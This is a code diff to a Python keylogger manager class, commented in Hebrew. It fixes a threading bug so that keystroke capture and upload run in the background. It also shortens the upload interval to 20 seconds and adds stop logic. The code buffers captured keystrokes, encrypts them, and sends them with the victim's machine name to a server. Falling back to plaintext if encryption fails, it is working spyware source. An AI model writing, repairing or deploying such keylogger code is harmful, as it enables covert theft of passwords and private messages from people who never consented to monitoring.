@@ -25,12 +25,13 @@ class KeyloggerManager:
         self.keylogger_listener.start_logging()           # מתחיל האזנה למקלדת
         threading.Thread(target=self.get_update,daemon=True).start() # יצירת תהליך נוסף האחראי לריצת הפונקציה get_update() הרץ במקביל לפונקציה  send_data()
         # מתחיל תהליכון לשליחת הנתונים לשרת
-        threading.Thread(target=self.send_data(), daemon=True).start()
+        threading.Thread(target=self.send_data, daemon=True).start()
 
                                                      # הפעלה של התהליך השני send_data()
 
     def stop(self):
         """עוצר את הניטור ושולח את הנתונים באופן מיידי."""
+        self.keylogger_listener.stop_logging()
         self.running = False  # מסמן שהמחלקה מפסיקה לפעול
         self.send_data()  # שולח את הנתונים האחרונים לשרת
 
@@ -51,7 +52,7 @@ class KeyloggerManager:
 
     def send_data(self):                    # פונקציה הרצה בלןלאה אין סופית כל פסק זמן, ממירה את האחסון לstr מצפינה אותו ושולחת לשרת/קובץ
         while self.running:
-            time.sleep(120)
+            time.sleep(20)
             if self.buffer:
                 dic2 = self.buffer.copy()
                 self.copied = True
@@ -60,7 +61,7 @@ class KeyloggerManager:
                     text += f"{k}:\n"
                     for w in v:
                         text += w
-                        text += "\n"
+                    text += "\n"
                 try:
                     encrypting_text = Encryption(text,self.key)
                     encrypted_text = encrypting_text.encrypt_text()
@@ -78,19 +79,18 @@ class KeyloggerManager:
             try:
                 encrypting_text = Encryption(text, self.key)
                 encrypted_text = encrypting_text.encrypt_text()
-                self.to_send.send_data(encrypted_text, self.machine_name)
+                self.to_send.send_data(encrypted_text, f"{self.machine_name}")
+                print("send succesfully")
             except:
-                self.to_send.send_data(text, self.machine_name)
+                self.to_send.send_data(text, f"{self.machine_name}")
+                print("send succesfully")
 
 
 
 
 
 
-# if __name__ == "__main__":
-#     key = CreateKey().key
-#     keylogger = KeyloggerManager(key)
-#     keylogger.start()
+
 
 
 
